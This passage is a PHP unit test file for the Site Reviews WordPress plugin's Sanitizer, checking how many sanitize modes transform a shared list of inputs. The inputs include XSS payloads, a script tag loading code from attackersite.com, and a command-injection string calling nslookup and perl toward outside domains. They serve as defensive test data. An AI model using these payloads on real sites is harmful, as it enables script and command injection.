<?php

namespace GeminiLabs\SiteReviews\Tests;

use GeminiLabs\SiteReviews\Modules\Sanitizer;

/**
 * Test case for the Plugin.
 *
 * @group plugin
 */
class SanitizerTest extends \WP_UnitTestCase
{
    protected $testValues;

    public function set_up()
    {
        parent::set_up();
        $this->testValues = [
            '',
            'abc',
            ['1'],
            ['a' => false],
            [13],
            [0],
            ['1' => 13],
            (object) ['b' => true],
            true,
            false,
            '<script>var x = 23;</script>',
            "<h3>This is a\n title!</h3>",
            ";(nslookup hit-gx_wgukmocpc5c8dddd.com||perl -e gethostbyname('hissstgxwgukmocpc5c80.me'))",
            'June 13, 1989',
            '03-12-2020',
            '0-0-2020',
            '2020',
            '李祖阳 xx xx',
            '#ax+dex(tomorrow) $200 200% @peter',
            'this is true',
            'single-review full-width" onmouseover="alert(69)',
            'matt@wordpress.org',
            'https//wordpress.org',
            'wordpress.org',
            'www.wordpress.org',
            'https://wordpress.org',
            -1,
            '<div><span><a id="xxx" href="https://apple.com" title="hello" target="_blank"><span>Hello</span></a> this is <em>a link</em> and a <strong>link</strong></span></div><ul><li></li></ul>',
            '<img sr<img src="x">c=x onerror=alert(55)>',
            '<script sr<img src="x">c=https://attackersite.com/test.js>',
            '&lt;img src=x alert(55)&gt;',
            '&amp;lt;script src=https://attackersite.com/test.js&amp;gt;',
            '&amp;lt;iframe src=javascript:alert(1)&amp;gt;',
            '<noscript> &amp;lt;p title=" &lt;/noscript&gt;&lt;style onload= alert(document.domain)//&quot;&gt; *{/*all*/color/*all*/:/*all*/#f78fb3/*all*/;} &lt;/style&gt;',
            '&amp;amp;amp;amp;amp;amp;amp;amp;lt;img src ooooonerror=nerror=nerror=nerror=nerror=alert(/XSS-Img/)&amp;amp;amp;amp;amp;amp;amp;amp;gt;',
            '&amp;amp;amp;amp;amp;amp;amp;amp;lt;iframe src=javascript:alert(/XSS-iFrame)&amp;amp;amp;amp;amp;amp;amp;amp;gt;',
        ];
    }

    public function test_sanitize_array_consolidate()
    {
        $sanitized = $this->sanitize('array-consolidate');
        $this->assertEquals($sanitized, [
            [],
            [],
            ['1'],
            ['a' => false],
            [13],
            [0],
            ['1' => 13],
            ['b' => true],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
        ]);
    }

    public function test_sanitize_array_int()
    {
        $sanitized = $this->sanitize('array-int');
        $this->assertEquals($sanitized, [
            [],
            [],
            [1],
            [],
            [13],
            [],
            [13],
            [],
            [],
            [],
            [],
            [],
            [],
            [1989],
            [],
            [],
            [2020],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
        ]);
    }

    public function test_sanitize_array_string()
    {
        $sanitized = $this->sanitize('array-string');
        $this->assertEquals($sanitized, [
            [],
            ['abc'],
            ['1'],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [''],
            ['This is a title!'],
            [";(nslookup hit-gx_wgukmocpc5c8dddd.com||perl -e gethostbyname('hissstgxwgukmocpc5c80.me'))"],
            ['June 13', '1989'],
            ['03-12-2020'],
            ['0-0-2020'],
            ['2020'],
            ['李祖阳 xx xx'],
            ['#ax+dex(tomorrow) $200 200% @peter'],
            ['this is true'],
            ['single-review full-width" "alert(69)'],
            ['matt@wordpress.org'],
            ['https//wordpress.org'],
            ['wordpress.org'],
            ['www.wordpress.org'],
            ['https://wordpress.org'],
            ['-1'],
            ['Hello this is a link and a link'],
            [''],
            [''],
            [''],
            [''],
            [''],
            [''],
            [''],
            [''],
        ]);
    }

    public function test_sanitize_attr()
    {
        $sanitized = $this->sanitize('attr');
        $this->assertEquals($sanitized, [
            '',
            'abc',
            '1',
            '',
            '13',
            '0',
            '13',
            '',
            '1',
            '',
            '&lt;script&gt;var x = 23;&lt;/script&gt;',
            "&lt;h3&gt;This is a\n title!&lt;/h3&gt;",
            ';(nslookup hit-gx_wgukmocpc5c8dddd.com||perl -e gethostbyname(&#039;hissstgxwgukmocpc5c80.me&#039;))',
            'June 13, 1989',
            '03-12-2020',
            '0-0-2020',
            '2020',
            '李祖阳 xx xx',
            '#ax+dex(tomorrow) $200 200% @peter',
            'this is true',
            'single-review full-width&quot; onmouseover=&quot;alert(69)',
            'matt@wordpress.org',
            'https//wordpress.org',
            'wordpress.org',
            'www.wordpress.org',
            'https://wordpress.org',
            '-1',
            '&lt;div&gt;&lt;span&gt;&lt;a id=&quot;xxx&quot; href=&quot;https://apple.com&quot; title=&quot;hello&quot; target=&quot;_blank&quot;&gt;&lt;span&gt;Hello&lt;/span&gt;&lt;/a&gt; this is &lt;em&gt;a link&lt;/em&gt; and a &lt;strong&gt;link&lt;/strong&gt;&lt;/span&gt;&lt;/div&gt;&lt;ul&gt;&lt;li&gt;&lt;/li&gt;&lt;/ul&gt;',
            '&lt;img sr&lt;img src=&quot;x&quot;&gt;c=x onerror=alert(55)&gt;',
            '&lt;script sr&lt;img src=&quot;x&quot;&gt;c=https://attackersite.com/test.js&gt;',
            '&lt;img src=x alert(55)&gt;',
            '&amp;lt;script src=https://attackersite.com/test.js&amp;gt;',
            '&amp;lt;iframe src=javascript:alert(1)&amp;gt;',
            '&lt;noscript&gt; &amp;lt;p title=&quot; &lt;/noscript&gt;&lt;style onload= alert(document.domain)//&quot;&gt; *{/*all*/color/*all*/:/*all*/#f78fb3/*all*/;} &lt;/style&gt;',
            '&amp;amp;amp;amp;amp;amp;amp;amp;lt;img src ooooonerror=nerror=nerror=nerror=nerror=alert(/XSS-Img/)&amp;amp;amp;amp;amp;amp;amp;amp;gt;',
            '&amp;amp;amp;amp;amp;amp;amp;amp;lt;iframe src=javascript:alert(/XSS-iFrame)&amp;amp;amp;amp;amp;amp;amp;amp;gt;',
        ]);
    }

    public function test_sanitize_attr_class()
    {
        $sanitized = $this->sanitize('attr-class');
        $this->assertEquals($sanitized, [
            '',
            'abc',
            '',
            '',
            '',
            '',
            '',
            '',
            '',
            '',
            'scriptvar x script',
            'h3This is a titleh3',
            'nslookup hit-gx_wgukmocpc5c8ddddcomperl -e gethostbynamehissstgxwgukmocpc5c80me',
            'June',
            '-12-2020',
            '-0-2020',
            '',
            'xx',
            'axdextomorrow peter',
            'this is true',
            'single-review full-width onmouseoveralert69',
            'mattwordpressorg',
            'httpswordpressorg',
            'wordpressorg',
            'wwwwordpressorg',
            'https:wordpressorg',
            '-1',
            'divspana idxxx hrefhttps:applecom titlehello target_blankspanHellospana this is ema linkem and a stronglinkstrongspandivulliliul',
            'img srimg srcxcx onerroralert55',
            'script srimg srcxchttps:attackersitecomtestjs',
            'ltimg srcx alert55gt',
            'ampltscript srchttps:attackersitecomtestjsampgt',
            'ampltiframe srcjavascript:alert1ampgt',
            'noscript ampltp title ltnoscriptgtltstyle onload alertdocumentdomainquotgt allcolorall:allf78fb3all ltstylegt',
            'ampampampampampampampampltimg src ooooonerrornerrornerrornerrornerroralertXSS-Imgampampampampampampampampgt',
            'ampampampampampampampampltiframe srcjavascript:alertXSS-iFrameampampampampampampampampgt',
        ]);
    }

    public function test_sanitize_attr_style()
    {
        $values = $this->testValues;
        $values[] = 'background-image: url(https://apple.com/image.jpg);';
        $values[] = 'color:red';
        $values[] = 'color:red;';
        $values[] = 'color: red; margin:0';
        $values[] = 'color: #000';
        $values[] = 'color: #000;margin';
        $values[] = 'color: #000 !important;';
        $sanitized = $this->sanitize('attr-style', $values);
        $this->assertEquals($sanitized, [
            '',
            '',
            '',
            '',
            '',
            '',
            '',
            '',
            '',
            '',
            '',
            '',
            '',
            '',
            '',
            '',
            '',
            '',
            '',
            '',
            '',
            '',
            '',
            '',
            '',
            '',
            '',
            '',
            '',
            '',
            '',
            '',
            '',
            '',
            '',
            '',
            'background-image:url(https://apple.com/image.jpg)',
            'color:red',
            'color:red',
            'color:red;margin:0',
            'color:#000',
            'color:#000',
            'color:#000 !important',
        ]);
    }

    public function test_sanitize_color()
    {
        $values = $this->testValues;
        $values[] = '#';
        $values[] = '#1';
        $values[] = '#11';
        $values[] = '#111';
        $values[] = 'rgb()';
        $values[] = 'rgb(0 0 0)';
        $values[] = 'rgb(0,0,0)';
        $values[] = 'rgba(0,0,0)';
        $values[] = 'rgba(0,0,0,99)';
        $values[] = 'rgba(0 0 0 / .2)';
        $values[] = 'rgba(0,0,0,1)';
        $sanitized = $this->sanitize('color', $values);
        $this->assertEquals($sanitized, [
            '',
            '',
            '',
            '',
            '',
            '',
            '',
            '',
            '',
            '',
            '',
            '',
            '',
            '',
            '',
            '',
            '',
            '',
            '',
            '',
            '',
            '',
            '',
            '',
            '',
            '',
            '',
            '',
            '',
            '',
            '',
            '',
            '',
            '',
            '',
            '',
            '',
            '',
            '',
            '#111',
            '',
            '',
            'rgb(0,0,0)',
            '',
            '',
            '',
            'rgba(0,0,0,1)',
        ]);
    }

    public function test_sanitize_date()
    {
        $sanitized = $this->sanitize('date');
        $this->assertEquals($sanitized, [
            '',
            '',
            '',
            '',
            '',
            '',
            '',
            '',
            '',
            '',
            '',
            '',
            '',
            '1989-06-13 00:00:00',
            '2020-12-03 00:00:00',
            '2019-11-30 00:00:00',
            wp_date('Y-m-d H:i:s', strtotime('2020')),
            '',
            '',
            '',
            '',
            '',
            '',
            '',
            '',
            '',
            wp_date('Y-m-d H:i:s', strtotime('-1')),
            '',
            '',
            '',
            '',
            '',
            '',
            '',
            '',
            '',
        ]);
        $sanitized = $this->sanitize('date:Y-m-d');
        $this->assertEquals($sanitized, [
            '',
            '',
            '',
            '',
            '',
            '',
            '',
            '',
            '',
            '',
            '',
            '',
            '',
            '1989-06-13',
            '2020-12-03',
            '2019-11-30',
            wp_date('Y-m-d', strtotime('2020')),
            '',
            '',
            '',
            '',
            '',
            '',
            '',
            '',
            '',
            wp_date('Y-m-d', strtotime('-1')),
            '',
            '',
            '',
            '',
            '',
            '',
            '',
            '',
            '',
        ]);
    }

    public function test_sanitize_email()
    {
        $sanitized = $this->sanitize('email');
        $this->assertEquals($sanitized, [
            '',
            '',
            '',
            '',
            '',
            '',
            '',
            '',
            '',
            '',
            '',
            '',
            '',
            '',
            '',
            '',
            '',
            '',
            '',
            '',
            '',
            'matt@wordpress.org',
            '',
            '',
            '',
            '',
            '',
            '',
            '',
            '',
            '',
            '',
            '',
            '',
            '',
            '',
        ]);
    }

    public function test_sanitize_id()
    {
        $sanitized = $this->sanitize('id');
        $this->assertEquals($sanitized, [
            '',
            'abc',
            '',
            '',
            '',
            '',
            '',
            '',
            '',
            '',
            '',
            'thisisatitle',
            'nslookuphit-gx_wgukmocpc5c8ddddc',
            'june131989',
            '-12-2020',
            '-0-2020',
            '',
            'xxxx',
            'axdextomorrow200200peter',
            'thisistrue',
            'single-reviewfull-widthalert69',
            'mattwordpressorg',
            'httpswordpressorg',
            'wordpressorg',
            'wwwwordpressorg',
            'httpswordpressorg',
            '-1',
            'hellothisisalinkandalink',
            '',
            '',
            '',
            '',
            '',
            '',
            '',
            '',
        ]);
    }

    public function test_sanitize_id_hash()
    {
        $sanitized = glsr(Sanitizer::class)->sanitizeIdHash('', 'form_');
        $this->assertMatchesRegularExpression('/form_([a-z0-9]{8})/', $sanitized);
        $sanitized = $this->sanitize('id-hash');
        $pattern = '/glsr_([a-z0-9]{8})/';
        $this->assertMatchesRegularExpression($pattern, $sanitized[0]);
        $this->assertEquals($sanitized[1], 'abc');
        $this->assertMatchesRegularExpression($pattern, $sanitized[2]);
        $this->assertMatchesRegularExpression($pattern, $sanitized[3]);
        $this->assertMatchesRegularExpression($pattern, $sanitized[4]);
        $this->assertMatchesRegularExpression($pattern, $sanitized[5]);
        $this->assertMatchesRegularExpression($pattern, $sanitized[6]);
        $this->assertMatchesRegularExpression($pattern, $sanitized[7]);
        $this->assertMatchesRegularExpression($pattern, $sanitized[8]);
        $this->assertMatchesRegularExpression($pattern, $sanitized[9]);
        $this->assertMatchesRegularExpression($pattern, $sanitized[10]);
        $this->assertEquals($sanitized[11], 'thisisatitle');
        $this->assertEquals($sanitized[12], 'nslookuphit-gx_wgukmocpc5c8ddddc');
        $this->assertEquals($sanitized[13], 'june131989');
        $this->assertEquals($sanitized[14], '-12-2020');
        $this->assertEquals($sanitized[15], '-0-2020');
        $this->assertMatchesRegularExpression($pattern, $sanitized[16]);
        $this->assertEquals($sanitized[17], 'xxxx');
        $this->assertEquals($sanitized[18], 'axdextomorrow200200peter');
        $this->assertEquals($sanitized[19], 'thisistrue');
        $this->assertEquals($sanitized[20], 'single-reviewfull-widthalert69');
        $this->assertEquals($sanitized[21], 'mattwordpressorg');
        $this->assertEquals($sanitized[22], 'httpswordpressorg');
        $this->assertEquals($sanitized[23], 'wordpressorg');
        $this->assertEquals($sanitized[24], 'wwwwordpressorg');
        $this->assertEquals($sanitized[25], 'httpswordpressorg');
        $this->assertEquals($sanitized[26], '-1');
        $this->assertEquals($sanitized[27], 'hellothisisalinkandalink');
        $this->assertMatchesRegularExpression($pattern, $sanitized[28]);
        $this->assertMatchesRegularExpression($pattern, $sanitized[29]);
        $this->assertMatchesRegularExpression($pattern, $sanitized[30]);
        $this->assertMatchesRegularExpression($pattern, $sanitized[31]);
        $this->assertMatchesRegularExpression($pattern, $sanitized[32]);
        $this->assertMatchesRegularExpression($pattern, $sanitized[33]);
        $this->assertMatchesRegularExpression($pattern, $sanitized[34]);
        $this->assertMatchesRegularExpression($pattern, $sanitized[35]);
    }

    public function test_sanitize_ip_address()
    {
        $values = $this->testValues;
        $values[] = '127*';
        $values[] = '127.*';
        $values[] = '127.0.*';
        $values[] = '127.0.0.*';
        $values[] = '127.0.0.1';
        $values[] = '103.21.244.0/22';
        $values[] = '2400:cb00';
        $values[] = '2400:cb00::';
        $values[] = '2400:cb00::/32';
        $sanitized = $this->sanitize('ip-address', $values);
        $this->assertEquals($sanitized, [
            '',
            '',
            '',
            '',
            '',
            '',
            '',
            '',
            '',
            '',
            '',
            '',
            '',
            '',
            '',
            '',
            '',
            '',
            '',
            '',
            '',
            '',
            '',
            '',
            '',
            '',
            '',
            '',
            '',
            '',
            '',
            '',
            '',
            '',
            '',
            '',
            '',
            '',
            '',
            '',
            '127.0.0.1',
            '',
            '',
            '2400:cb00::',
            '',
        ]);
    }

    public function test_sanitize_json()
    {
        $sanitized = $this->sanitize('json');
        $this->assertEquals($sanitized, [
            [],
            [],
            ['1'],
            ['a' => false],
            [13],
            [0],
            [1 => 13],
            ['b' => true],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
        ]);
    }

    public function test_sanitize_key()
    {
        $sanitized = $this->sanitize('key');
        $this->assertEquals($sanitized, [
            '',
            'abc',
            '1',
            '',
            '13',
            '0',
            '13',
            '',
            '1',
            '',
            '',
            'thisisatitle',
            'nslookuphit_gx_wgukmocpc5c8ddddc',
            'june131989',
            '03_12_2020',
            '0_0_2020',
            '2020',
            'xxxx',
            'axdextomorrow200200peter',
            'thisistrue',
            'single_reviewfull_widthalert69',
            'mattwordpressorg',
            'httpswordpressorg',
            'wordpressorg',
            'wwwwordpressorg',
            'httpswordpressorg',
            '_1',
            'hellothisisalinkandalink',
            '',
            '',
            '',
            '',
            '',
            '',
            '',
            '',
        ]);
    }

    public function test_sanitize_max()
    {
        $sanitized = $this->sanitize('max:21');
        $this->assertEquals($sanitized, [
            0,
            0,
            0,
            0,
            0,
            0,
            0,
            0,
            1,
            0,
            0,
            0,
            0,
            0,
            0,
            0,
            21,
            0,
            0,
            0,
            0,
            0,
            0,
            0,
            0,
            0,
            -1,
            0,
            0,
            0,
            0,
            0,
            0,
            0,
            0,
            0,
        ]);
    }

    public function test_sanitize_min()
    {
        $sanitized = $this->sanitize('min:13');
        $this->assertEquals($sanitized, [
            13,
            13,
            13,
            13,
            13,
            13,
            13,
            13,
            13,
            13,
            13,
            13,
            13,
            13,
            13,
            13,
            2020,
            13,
            13,
            13,
            13,
            13,
            13,
            13,
            13,
            13,
            13,
            13,
            13,
            13,
            13,
            13,
            13,
            13,
            13,
            13,
        ]);
    }

    public function test_sanitize_min_max()
    {
        $sanitized = $this->sanitize('min:3|max:50');
        $this->assertEquals($sanitized, [
            3,
            3,
            3,
            3,
            3,
            3,
            3,
            3,
            3,
            3,
            3,
            3,
            3,
            3,
            3,
            3,
            50,
            3,
            3,
            3,
            3,
            3,
            3,
            3,
            3,
            3,
            3,
            3,
            3,
            3,
            3,
            3,
            3,
            3,
            3,
            3,
        ]);
    }

    public function test_sanitize_name()
    {
        $sanitized = $this->sanitize('name');
        $this->assertEquals($sanitized, [
            '',
            'abc',
            '',
            '',
            '',
            '',
            '',
            '',
            '',
            '',
            '',
            'thisisatitle',
            'nslookuphit-gx_wgukmocpccddddcomperl-egethostbynamehissstgxwgukmocpccme',
            'june',
            '',
            '',
            '',
            'xxxx',
            'axdextomorrowpeter',
            'thisistrue',
            'single-reviewfull-widthalert',
            'mattwordpressorg',
            'httpswordpressorg',
            'wordpressorg',
            'wwwwordpressorg',
            'httpswordpressorg',
            '',
            'hellothisisalinkandalink',
            '',
            '',
            '',
            '',
            '',
            '',
            '',
            '',
        ]);
    }

    public function test_sanitize_numeric()
    {
        $sanitized = $this->sanitize('numeric');
        $this->assertEquals($sanitized, [
            '',
            '',
            '',
            '',
            '',
            '',
            '',
            '',
            '',
            '',
            '',
            '',
            '',
            '',
            '',
            '',
            '2020',
            '',
            '',
            '',
            '',
            '',
            '',
            '',
            '',
            '',
            '-1',
            '',
            '',
            '',
            '',
            '',
            '',
            '',
            '',
            '',
        ]);
    }

    public function test_sanitize_post_ids()
    {
        $posts = self::factory()->post->create_many(2);
        $values = $this->testValues;
        $values[] = $posts[0];
        $values[] = $posts;
        $values[] = implode(',', $posts);
        $values[] = array_diff([1, 2, 3, 4, 5, 6, 7, 8, 9], $posts);
        $sanitized = $this->sanitize('post-ids', $values);
        $this->assertEquals($sanitized, [
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [$posts[0]],
            $posts,
            $posts,
            [],
        ]);
    }

    public function test_sanitize_rating()
    {
        add_filter('site-reviews/const/MAX_RATING', fn () => 5);
        add_filter('site-reviews/const/MIN_RATING', '__return_zero');
        $sanitized = $this->sanitize('rating');
        $this->assertEquals($sanitized, [
            0,
            0,
            0,
            0,
            0,
            0,
            0,
            0,
            1,
            0,
            0,
            0,
            0,
            0,
            0,
            0,
            5,
            0,
            0,
            0,
            0,
            0,
            0,
            0,
            0,
            0,
            0,
            0,
            0,
            0,
            0,
            0,
            0,
            0,
            0,
            0,
        ]);
    }

    public function test_sanitize_regex()
    {
        $sanitized = $this->sanitize('regex');
        $this->assertEquals(array_filter($sanitized), []);
        $sanitized = $this->sanitize('regex:/[^\w\-]/');
        $this->assertEquals($sanitized, [
            '',
            'abc',
            '1',
            '',
            '13',
            '0',
            '13',
            '',
            '1',
            '',
            'scriptvarx23script',
            'h3Thisisatitleh3',
            'nslookuphit-gx_wgukmocpc5c8ddddcomperl-egethostbynamehissstgxwgukmocpc5c80me',
            'June131989',
            '03-12-2020',
            '0-0-2020',
            '2020',
            'xxxx',
            'axdextomorrow200200peter',
            'thisistrue',
            'single-reviewfull-widthonmouseoveralert69',
            'mattwordpressorg',
            'httpswordpressorg',
            'wordpressorg',
            'wwwwordpressorg',
            'httpswordpressorg',
            '-1',
            'divspanaidxxxhrefhttpsapplecomtitlehellotarget_blankspanHellospanathisisemalinkemandastronglinkstrongspandivulliliul',
            'imgsrimgsrcxcxonerroralert55',
            'scriptsrimgsrcxchttpsattackersitecomtestjs',
            'ltimgsrcxalert55gt',
            'ampltscriptsrchttpsattackersitecomtestjsampgt',
            'ampltiframesrcjavascriptalert1ampgt',
            'noscriptampltptitleltnoscriptgtltstyleonloadalertdocumentdomainquotgtallcolorallallf78fb3allltstylegt',
            'ampampampampampampampampltimgsrcooooonerrornerrornerrornerrornerroralertXSS-Imgampampampampampampampampgt',
            'ampampampampampampampampltiframesrcjavascriptalertXSS-iFrameampampampampampampampampgt',
        ]);
    }

    public function test_sanitize_slug()
    {
        $sanitized = $this->sanitize('slug');
        $this->assertEquals($sanitized, [
            '',
            'abc',
            '1',
            '',
            '13',
            '0',
            '13',
            '',
            '1',
            '',
            '',
            'this-is-a-title',
            'nslookup-hit-gx_wgukmocpc5c8dddd-comperl-e-gethostbynamehissstgxwgukmocpc5c80-me',
            'june-13-1989',
            '03-12-2020',
            '0-0-2020',
            '2020',
            '%e6%9d%8e%e7%a5%96%e9%98%b3-xx-xx',
            'axdextomorrow-200-200-peter',
            'this-is-true',
            'single-review-full-width-alert69',
            'mattwordpress-org',
            'https-wordpress-org',
            'wordpress-org',
            'www-wordpress-org',
            'https-wordpress-org',
            '1',
            'hello-this-is-a-link-and-a-link',
            '',
            '',
            '',
            '',
            '',
            '',
            '',
            '',
        ]);
    }

    public function test_sanitize_term_ids()
    {
        $terms = self::factory()->term->create_many(2, ['taxonomy' => glsr()->taxonomy]);
        $values = $this->testValues;
        $values[] = $terms[0];
        $values[] = $terms;
        $values[] = implode(',', $terms);
        $values[] = array_diff([1, 2, 3, 4, 5, 6, 7, 8, 9], $terms);
        $sanitized = $this->sanitize('term-ids', $values);
        $this->assertEquals($sanitized, [
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [$terms[0]],
            $terms,
            $terms,
            [],
        ]);
    }

    public function test_sanitize_text()
    {
        $sanitized = $this->sanitize('text');
        $this->assertEquals($sanitized, [
            '',
            'abc',
            '1',
            '',
            '13',
            '0',
            '13',
            '',
            '1',
            '',
            '',
            'This is a title!',
            ";(nslookup hit-gx_wgukmocpc5c8dddd.com||perl -e gethostbyname('hissstgxwgukmocpc5c80.me'))",
            'June 13, 1989',
            '03-12-2020',
            '0-0-2020',
            '2020',
            '李祖阳 xx xx',
            '#ax+dex(tomorrow) $200 200% @peter',
            'this is true',
            'single-review full-width" "alert(69)',
            'matt@wordpress.org',
            'https//wordpress.org',
            'wordpress.org',
            'www.wordpress.org',
            'https://wordpress.org',
            '-1',
            'Hello this is a link and a link',
            '',
            '',
            '',
            '',
            '',
            '',
            '',
            '',
        ]);
    }

    public function test_sanitize_text_html()
    {
        $sanitized = $this->sanitize('text-html');
        $this->assertEquals($sanitized, [
            '',
            'abc',
            '1',
            '',
            '13',
            '0',
            '13',
            '',
            '1',
            '',
            'var x = 23;',
            "This is a\n title!",
            ";(nslookup hit-gx_wgukmocpc5c8dddd.com||perl -e gethostbyname('hissstgxwgukmocpc5c80.me'))",
            'June 13, 1989',
            '03-12-2020',
            '0-0-2020',
            '2020',
            '李祖阳 xx xx',
            '#ax+dex(tomorrow) $200 200% @peter',
            'this is true',
            'single-review full-width" "alert(69)',
            'matt@wordpress.org',
            'https//wordpress.org',
            'wordpress.org',
            'www.wordpress.org',
            'https://wordpress.org',
            '-1',
            '<a id="xxx" href="https://apple.com" title="hello" target="_blank">Hello</a> this is <em>a link</em> and a <strong>link</strong>',
            '',
            '',
            '',
            '',
            '',
            ' &lt;p title=&quot;  *{/*all*/color/*all*/:/*all*/#f78fb3/*all*/;} ',
            '',
            '',
        ]);
        $sanitized = $this->sanitize('text-html:a,img');
        $this->assertEquals($sanitized[27], '<a id="xxx" href="https://apple.com" title="hello" target="_blank">Hello</a> this is a link and a link');
        $this->assertEquals($sanitized[28], '&lt;img sr<img src="x">c=x alert(55)&gt;');
        $this->assertEquals($sanitized[29], '&lt;script sr<img src="x">c=https://attackersite.com/test.js&gt;');
    }

    public function test_sanitize_text_multiline()
    {
        $sanitized = $this->sanitize('text-multiline');
        $this->assertEquals($sanitized, [
            '',
            'abc',
            '1',
            '',
            '13',
            '0',
            '13',
            '',
            '1',
            '',
            '',
            "This is a\n title!",
            ";(nslookup hit-gx_wgukmocpc5c8dddd.com||perl -e gethostbyname('hissstgxwgukmocpc5c80.me'))",
            'June 13, 1989',
            '03-12-2020',
            '0-0-2020',
            '2020',
            '李祖阳 xx xx',
            '#ax+dex(tomorrow) $200 200% @peter',
            'this is true',
            'single-review full-width" "alert(69)',
            'matt@wordpress.org',
            'https//wordpress.org',
            'wordpress.org',
            'www.wordpress.org',
            'https://wordpress.org',
            '-1',
            'Hello this is a link and a link',
            '',
            '',
            '',
            '',
            '',
            '',
            '',
            '',
        ]);
    }

    public function test_sanitize_text_post()
    {
        $sanitized = $this->sanitize('text-post');
        $this->assertEquals($sanitized, [
            '',
            'abc',
            '1',
            '',
            '13',
            '0',
            '13',
            '',
            '1',
            '',
            'var x = 23;',
            "<h3>This is a\n title!</h3>",
            ";(nslookup hit-gx_wgukmocpc5c8dddd.com||perl -e gethostbyname(\'hissstgxwgukmocpc5c80.me\'))",
            'June 13, 1989',
            '03-12-2020',
            '0-0-2020',
            '2020',
            '李祖阳 xx xx',
            '#ax+dex(tomorrow) $200 200% @peter',
            'this is true',
            'single-review full-width\" \"alert(69)',
            'matt@wordpress.org',
            'https//wordpress.org',
            'wordpress.org',
            'www.wordpress.org',
            'https://wordpress.org',
            '-1',
            '<div><span><a id=\"xxx\" href=\"https://apple.com\" title=\"hello\" target=\"_blank\"><span>Hello</span></a> this is <em>a link</em> and a <strong>link</strong></span></div><ul><li></li></ul>',
            '&lt;img sr<img src=\"x\">c=x alert(55)&gt;',
            '&lt;script sr<img src=\"x\">c=https://attackersite.com/test.js&gt;',
            '<img src=\"x\">',
            '',
            '',
            ' &lt;p title=&quot;  *{/*all*/color/*all*/:/*all*/#f78fb3/*all*/;} ',
            '<img src>',
            '',
        ]);
    }

    public function test_sanitize_url()
    {
        $sanitized = $this->sanitize('url');
        $this->assertEquals($sanitized, [
            '',
            'https://abc',
            'https://1',
            '',
            'https://13',
            'https://0',
            'https://13',
            '',
            'https://1',
            '',
            '',
            '',
            '',
            '',
            'https://03-12-2020',
            'https://0-0-2020',
            'https://2020',
            '',
            '',
            '',
            '',
            'https://matt@wordpress.org',
            'https://https//wordpress.org',
            'https://wordpress.org',
            'https://www.wordpress.org',
            'https://wordpress.org',
            '',
            '',
            '',
            '',
            '',
            '',
            '',
            '',
            '',
            '',
        ]);
    }

    public function test_sanitize_user_email()
    {
        $sanitized = $this->sanitize('user-email');
        $this->assertEquals($sanitized, [
            '',
            '',
            '',
            '',
            '',
            '',
            '',
            '',
            '',
            '',
            '',
            '',
            '',
            '',
            '',
            '',
            '',
            '',
            '',
            '',
            '',
            'matt@wordpress.org',
            '',
            '',
            '',
            '',
            '',
            '',
            '',
            '',
            '',
            '',
            '',
            '',
            '',
            '',
        ]);
    }

    public function test_sanitize_user_id()
    {
        $userId1 = self::factory()->user->create();
        $userId2 = self::factory()->user->create();
        $values = $this->testValues;
        $values[] = $userId1;
        $sanitized = $this->sanitize('user-id', $values);
        $this->assertEquals($sanitized, [
            0,
            0,
            0,
            0,
            0,
            0,
            0,
            0,
            0,
            0,
            0,
            0,
            0,
            0,
            0,
            0,
            0,
            0,
            0,
            0,
            0,
            0,
            0,
            0,
            0,
            0,
            0,
            0,
            0,
            0,
            0,
            0,
            0,
            0,
            0,
            0,
            $userId1,
        ]);
        $sanitized = $this->sanitize("user-id:{$userId2}", $values);
        $this->assertEquals($sanitized, [
            $userId2,
            $userId2,
            $userId2,
            $userId2,
            $userId2,
            $userId2,
            $userId2,
            $userId2,
            $userId2,
            $userId2,
            $userId2,
            $userId2,
            $userId2,
            $userId2,
            $userId2,
            $userId2,
            $userId2,
            $userId2,
            $userId2,
            $userId2,
            $userId2,
            $userId2,
            $userId2,
            $userId2,
            $userId2,
            $userId2,
            $userId2,
            $userId2,
            $userId2,
            $userId2,
            $userId2,
            $userId2,
            $userId2,
            $userId2,
            $userId2,
            $userId2,
            $userId1,
        ]);
    }

    public function test_sanitize_user_ids()
    {
        self::factory()->user->create_many(2);
        $users = get_users(['fields' => 'ID']);
        $values = $this->testValues;
        $values[] = $users[0];
        $values[] = $users;
        $values[] = implode(',', $users);
        $values[] = array_diff([1, 2, 3, 4, 5, 6, 7, 8, 9], $users);
        $sanitized = $this->sanitize('user-ids', $values);
        $this->assertEquals($sanitized, [
            [],
            [],
            array_intersect($users, array_map('intval', $values[2])),
            [],
            array_intersect($values[4], $users),
            [],
            array_intersect($values[6], $users),
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [$users[0]],
            $users,
            $users,
            [],
        ]);
    }

    public function test_sanitize_user_name()
    {
        $values = $this->testValues;
        $values[] = 'Łukasz';
        $values[] = 'မောင်မောင် အောင်မျိုး ကိုကိုဦး မိုးမြင့်သန္တာ';
        $sanitized = $this->sanitize('user-name', $values);
        $this->assertEquals($sanitized, [
            '',
            'abc',
            '1',
            '',
            '13',
            '0',
            '13',
            '',
            '1',
            '',
            '',
            'This is a title',
            'nslookup hit-gxwgukmocpc5c8dddd.comperl -e gethostbyname\'hissstgxwgukmocpc5c80.me\'',
            'June 13, 1989',
            '03-12-2020',
            '0-0-2020',
            '2020',
            '李祖阳 xx xx',
